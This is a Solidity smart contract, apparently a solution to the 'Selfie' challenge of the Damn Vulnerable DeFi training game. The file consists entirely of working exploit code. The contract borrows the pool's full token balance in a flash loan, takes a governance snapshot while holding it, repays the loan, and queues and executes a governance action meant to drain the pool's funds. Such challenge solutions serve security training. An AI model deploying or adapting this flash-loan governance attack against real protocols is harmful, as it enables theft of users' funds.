// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface ISimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external;

    function executeAction(uint256 actionId) external;
}

interface IDamnValuableTokenSnapshot {
    function snapshot() external;
}

contract AttackSelfie {
    using Address for address payable;
    address payable public owner;

    IERC20 public immutable DVTtoken;

    address payable private selfiePool;
    ISelfiePool public selfiePoolInterface;

    address payable private simpleGovernance;
    ISimpleGovernance public simpleGovernanceInterface;

    address private dvtSnapshot;
    IDamnValuableTokenSnapshot public dvtSnapshotInterface;

    constructor(
        address dvtToken,
        address payable selfiePoolAddress,
        address payable simpleGovernanceAddress,
        address dvtSnapshotAddress
    ) {
        DVTtoken = IERC20(dvtToken);
        selfiePool = selfiePoolAddress;
        selfiePoolInterface = ISelfiePool(selfiePool);
        simpleGovernance = simpleGovernanceAddress;
        simpleGovernanceInterface = ISimpleGovernance(simpleGovernance);
        dvtSnapshot = dvtSnapshotAddress;
        dvtSnapshotInterface = IDamnValuableTokenSnapshot(dvtSnapshot);
        owner = payable(msg.sender);
    }

    function receiveTokens(address token, uint256 borrowAmount)
        external
        payable
    {
        // Call a snapshot
        dvtSnapshotInterface.snapshot();
        // Repay the flashLoan
        DVTtoken.transfer(selfiePool, DVTtoken.balanceOf(address(this)));
    }

    function attack(bytes calldata data) public {
        // First, take out flashLoan for entirety of the selfie pool
        selfiePoolInterface.flashLoan(DVTtoken.balanceOf(selfiePool));
        // Call queueAction, the param receiver is the pool
        simpleGovernanceInterface.queueAction(
            selfiePool,
            data,
            0 // weiAmount can be 0 since drainAllFunds is not payable
        );
    }

    function finishHim() public {
        // Call executeAction
        simpleGovernanceInterface.executeAction(1); // since we were the first action
    }
}
